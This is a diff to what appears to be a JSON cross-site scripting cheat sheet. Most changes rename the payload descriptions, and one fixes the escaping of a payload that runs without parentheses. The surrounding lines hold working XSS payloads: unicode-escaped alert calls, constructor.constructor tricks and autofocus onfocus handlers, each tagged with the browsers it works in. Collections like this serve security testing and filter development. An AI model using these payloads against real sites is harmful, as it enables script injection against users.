@@ -347,25 +347,25 @@
     "context": "js_string_single"
   },
   {
-    "description": "\\u0061 escape (js_string_single)",
+    "description": "Unicode escape (js_string_single)",
     "code": "'-\\u0061lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "\\u{0061} escape (js_string_single)",
+    "description": "ES6 unicode escape (js_string_single)",
     "code": "'-\\u{0061}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "\\u{61} escape (js_string_single)",
+    "description": "ES6 unicode escape no zeros (js_string_single)",
     "code": "'-\\u{61}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "\\u{00000000000061} escape (js_string_single)",
+    "description": "ES6 unicode escape padded zeros (js_string_single)",
     "code": "'-\\u{00000000000061}lert(1)-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
@@ -1193,31 +1193,31 @@
     "context": "js_string_single"
   },
   {
-    "description": "{}.constructor.constructor() (js_string_single)",
+    "description": "Object constructor.constructor() (js_string_single)",
     "code": "'-{}.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "''.constructor.constructor() (js_string_single)",
+    "description": "String constructor.constructor() (js_string_single)",
     "code": "'-''.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "[].constructor.constructor() (js_string_single)",
+    "description": "Array constructor.constructor() (js_string_single)",
     "code": "'-[].constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "0..constructor.constructor() (js_string_single)",
+    "description": "Number constructor.constructor() (js_string_single)",
     "code": "'-0..constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
   },
   {
-    "description": "0n.constructor.constructor() (js_string_single)",
+    "description": "Bigint constructor.constructor() (js_string_single)",
     "code": "'-0n.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "context": "js_string_single"
@@ -1562,27 +1562,27 @@
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using {}.constructor.constructor() (html)",
+    "description": "<xss> with onfocus using Object constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using ''.constructor.constructor() (html)",
+    "description": "<xss> with onfocus using String constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=''.constructor.constructor('a'+'lert(1)')()>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using [].constructor.constructor() (html)",
+    "description": "<xss> with onfocus using Array constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=[].constructor.constructor('a'+'lert(1)')()>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using 0..constructor.constructor() (html)",
+    "description": "<xss> with onfocus using Number constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=0..constructor.constructor('a'+'lert(1)')()>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using 0n.constructor.constructor() (html)",
+    "description": "<xss> with onfocus using Bigint constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=0n.constructor.constructor('a'+'lert(1)')()>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
@@ -1712,22 +1712,22 @@
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using \\u0061 escape (html)",
+    "description": "<xss> with onfocus using unicode escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u0061lert(1)>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using \\u{0061} escape (html)",
+    "description": "<xss> with onfocus using ES6 unicode escape (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{0061}lert(1)>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using \\u{61} escape (html)",
+    "description": "<xss> with onfocus using ES6 unicode escape without zero padding (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{61}lert(1)>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
-    "description": "<xss> with onfocus using \\u{00000000000061} escape (html)",
+    "description": "<xss> with onfocus using ES6 unicode escape with zero padding (html)",
     "code": "<xss tabindex=1 autofocus onfocus=\\u{00000000000061}lert(1)>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
@@ -1888,7 +1888,7 @@
   },
   {
     "description": "No parentheses using the function constructor in Error.prepareStackTrace",
-    "code": "<script>Object.prototype.message='alert\x281337\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>",
+    "code": "<script>Object.prototype.message='alert\\x281337\\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>",
     "browsers": ["chrome"]
   }
 ]
